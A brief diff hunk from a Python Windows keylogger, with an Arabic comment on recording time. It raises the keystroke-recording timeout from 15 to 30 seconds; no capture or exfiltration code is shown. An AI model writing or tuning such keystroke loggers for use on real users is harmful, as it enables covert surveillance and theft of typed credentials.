@@ -4,7 +4,7 @@ import time
 from ctypes import byref, create_string_buffer, c_ulong, windll
 
 # مدة التسجيل بالثواني
-TIMEOUT = 15
+TIMEOUT = 30
 LOG_DATA = ""
 
 class KeyLogger:
